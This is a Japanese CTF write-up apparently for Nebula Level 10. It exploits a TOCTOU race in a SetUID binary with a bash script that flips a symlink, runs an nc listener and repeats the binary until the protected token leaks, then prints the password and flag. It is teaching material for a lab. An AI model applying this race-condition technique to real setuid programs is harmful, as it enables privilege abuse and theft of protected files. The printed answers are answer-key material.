# Level 10

## 目的
ユーザー `flag10` の権限で `getflag` コマンドを実行し、フラグを取得する。

## 手順と解説

### 1. 調査

`level10` ユーザーでログイン後、ホームディレクトリを確認します。

```bash
ls -l
```
出力:
```text
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```
SetUIDバイナリ `level10` と、`flag10` のみが読み取れる `token` ファイルがあります。

バイナリを実行してみます。
```bash
./level10
# output: ./level10 file host
#         sends file to host if you have access to it
```
このプログラムは、指定されたファイルを指定されたホスト（ポート6969）に送信する機能を持っています。
ただし、「アクセス権があれば (if you have access to it)」という条件があります。

### 2. 脆弱性の特定

`ltrace` で動作を確認すると、以下の順序で処理が行われています。

1.  `access()` 関数で、実行ユーザー（`level10`）がファイルにアクセスできるか確認する。
2.  アクセス可能であれば、`open()` 関数でファイルを開く。
3.  ホスト（ポート6969）に接続し、ファイル内容を送信する。

ここで、`1. チェック` と `2. 使用` の間にわずかな時間差があります。これは **TOCTOU (Time-of-Check to Time-of-Use)** と呼ばれる競合状態（Race Condition）の脆弱性です。

チェックの瞬間は `level10` がアクセスできるファイル（例: `/tmp/dummy`）を指しておき、`open()` される瞬間にシンボリックリンクを切り替えて `token` ファイル（`flag10` 権限なら読める）を指すようにすれば、セキュリティチェックをすり抜けて `token` の中身を送信させることができます。

### 3. エクスプロイト（攻撃）

以下のスクリプトを作成して実行します。

1.  **シンボリックリンクの切り替え**:
    無限ループで `/tmp/link` の向き先を「ダミーファイル」と「本物の `token`」の間で高速に切り替えます。
2.  **受信サーバー**:
    `nc` コマンドでポート 6969 をリッスンし、送られてくるデータを受け取ります。
3.  **プログラム実行**:
    無限ループで `./level10 /tmp/link 127.0.0.1` を実行し、競合状態が発生するのを待ちます。

**攻撃スクリプト（例）:**
```bash
#!/bin/bash
touch /tmp/dummy
# リンク切り替えループ
while true; do
    ln -sf /tmp/dummy /tmp/link
    ln -sf /home/user/level10/token /tmp/link
done &

# 受信ループ
while true; do
    nc -l 6969 >> /tmp/output 2>/dev/null
done &

# 攻撃実行
for i in {1..100000}; do
    ./level10 /tmp/link 127.0.0.1 >/dev/null 2>&1
done

while true; do
   ./level10 /tmp/link 127.0.0.1 >/dev/null 2>&1
done
```

### 4. 結果

`/tmp/output` に `token` の内容が書き込まれます。
（ノイズが混ざる場合がありますが、パスワードらしい文字列を探します）

```text
woupa2yuojeeaaed06riuj63c
```

このパスワードを使って `flag10` としてログインし、フラグを取得します。

```bash
su flag10
# Password: woupa2yuojeeaaed06riuj63c
getflag
```

## 結果

### flag10 のパスワード
`woupa2yuojeeaaed06riuj63c`

### トークン (Flag)
`feulo4b72j7edeahuete3no7c`
